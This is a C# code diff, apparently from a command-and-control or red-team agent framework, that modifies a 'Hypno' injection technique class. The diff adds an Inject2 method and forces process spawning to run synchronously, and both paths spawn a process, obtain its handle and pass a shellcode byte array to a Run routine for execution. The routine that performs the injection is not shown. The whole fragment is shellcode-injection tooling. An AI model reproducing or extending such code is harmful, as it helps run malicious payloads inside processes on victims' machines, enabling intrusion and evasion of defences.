@@ -13,14 +13,40 @@ namespace Agent
     internal class Hypno : ITechnique
     {
         int ITechnique.id => 4;
+        private static readonly TaskScheduler _singleThreadScheduler = new ConcurrentExclusiveSchedulerPair().ExclusiveScheduler;
+
+        async Task<bool> Inject2(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        {
+            return await Task.Factory.StartNew(async () =>
+            {
+                spawnOptions.suspended = false;
+
+                if (!await spawner.Spawn(spawnOptions))
+                {
+                    return false;
+                }
+
+                SafeProcessHandle hProc;
+
+                if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
+                {
+                    return false;
+                }
+
+                return Run(hProc.DangerousGetHandle(), shellcode);
+            }, CancellationToken.None, TaskCreationOptions.None, _singleThreadScheduler).Unwrap();
+        }
 
         async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             spawnOptions.suspended = false;
-            if (!await spawner.Spawn(spawnOptions))
+
+            //Force synchronous to hopefully ensure same thread execution
+            if (!spawner.Spawn(spawnOptions).GetAwaiter().GetResult())
             {
                 return false;
             }
+
             SafeProcessHandle hProc;
 
             if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
